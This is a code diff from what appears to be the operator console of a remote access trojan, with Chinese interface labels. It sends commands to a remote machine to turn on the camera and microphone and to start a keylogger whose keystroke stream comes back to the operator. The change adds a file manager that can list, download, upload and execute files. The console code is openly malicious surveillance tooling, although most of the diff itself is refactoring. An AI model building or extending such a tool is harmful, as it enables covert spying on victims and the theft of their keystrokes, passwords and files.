@@ -3,7 +3,7 @@ from camera import *
 from pynput import keyboard
 from microphone import *
 from keylogger import *
-
+from fileManager import *
 
 
 operation_map = {
@@ -48,19 +48,24 @@ async def disconnected(GUI):
     GUI.append_log("[*] Connection closed")
 
 
-async def fileManager(GUI):
+async def fileManager(GUI, operation):
     # 这里放具体的操作
+    GUI.fileList.setEnabled(False)
+    GUI.fileDownload.setEnabled(False)
+    GUI.fileUpload.setEnabled(False)
+    GUI.fileExcute.setEnabled(False)
     try:
-        operation = "Hello, Server!"
-        GUI.connections["fileManager"]["writer"].write(operation.encode())
-        await GUI.connections["fileManager"]["writer"].drain()
-        GUI.append_log(f"[*] Sent operation: {operation}")
-
-        GUI.append_log("[*] Waiting for response...")
-        response = await GUI.connections["fileManager"]["reader"].read(1024)
-        GUI.append_log(f"[*] Received response: {response.decode('utf-8')}")
+        GUI.connections["fileManager"]["writer"]
+        GUI.connections["fileManager"]["reader"]
+        await clientFileManager(GUI, GUI.connections["fileManager"]["writer"],
+                                GUI.connections["fileManager"]["reader"], operation)
     except Exception as e:
-        GUI.append_log(f"[!] Unexpected error: {e}")
+        GUI.append_log(f"[!] 文件管理未知错误: {e}")
+    finally:
+        GUI.fileList.setEnabled(True)
+        GUI.fileDownload.setEnabled(True)
+        GUI.fileUpload.setEnabled(True)
+        GUI.fileExcute.setEnabled(True)
 
 
 async def regmanager(GUI):
@@ -81,7 +86,7 @@ async def regmanager(GUI):
 async def opencamera(GUI):
     try:
         if GUI.openCamera.text() == "开启摄像头":
-            GUI.camera_check =True
+            GUI.camera_check = True
             operation = "Hello, Server!"
             GUI.connections["openCamera"]["writer"].write(operation.encode())
             await GUI.connections["openCamera"]["writer"].drain()
@@ -89,7 +94,8 @@ async def opencamera(GUI):
 
             GUI.append_log("[*] Waiting for response...")
             response = await GUI.connections["openCamera"]["reader"].read(1024)
-            GUI.append_log(f"[*] Received response: {response.decode('utf-8')}")
+            GUI.append_log(
+                f"[*] Received response: {response.decode('utf-8')}")
 
             # 切换按钮文本为 "关闭摄像头"
             GUI.openCamera.setText("关闭摄像头")
@@ -109,13 +115,15 @@ async def openmicrophone(GUI):
         if GUI.openMicrophone.text() == "开启麦克风":
             GUI.microphone_check = True
             operation = "Hello, Server!"
-            GUI.connections["openMicrophone"]["writer"].write(operation.encode())
+            GUI.connections["openMicrophone"]["writer"].write(
+                operation.encode())
             await GUI.connections["openMicrophone"]["writer"].drain()
             GUI.append_log(f"[*] Sent operation: {operation}")
 
             GUI.append_log("[*] Waiting for response...")
             response = await GUI.connections["openMicrophone"]["reader"].read(1024)
-            GUI.append_log(f"[*] Received response: {response.decode('utf-8')}")
+            GUI.append_log(
+                f"[*] Received response: {response.decode('utf-8')}")
 
             # 切换按钮文本为 "关闭麦克风"
             GUI.openMicrophone.setText("关闭麦克风")
@@ -134,7 +142,7 @@ async def keylogger(GUI):
     # 这里放具体的操作
     try:
         if GUI.keylogger.text() == "键盘记录":
-            GUI.keylogger_check =True
+            GUI.keylogger_check = True
             operation = "start keylogger"
             GUI.connections["keylogger"]["writer"].write(operation.encode())
             await GUI.connections["keylogger"]["writer"].drain()
@@ -142,18 +150,17 @@ async def keylogger(GUI):
 
             GUI.append_log("[*] Waiting for response...")
             response = await GUI.connections["keylogger"]["reader"].read(1024)
-            GUI.append_log(f"[*] Received response: {response.decode('utf-8')}")
+            GUI.append_log(
+                f"[*] Received response: {response.decode('utf-8')}")
 
             # 切换按钮文本为 "停止键盘记录"
             GUI.keylogger.setText("停止键盘记录")
             # 启动键盘记录接收
             win_manager = KeyloggerManager()
-            await receive_keylogger_stream(GUI,win_manager)
+            await receive_keylogger_stream(GUI, win_manager)
         else:
             # 停止键盘记录
             GUI.keylogger_check = False
             GUI.keylogger.setText("键盘记录")
     except Exception as e:
         GUI.append_log(f"[!] Unexpected error: {e}")
-
-
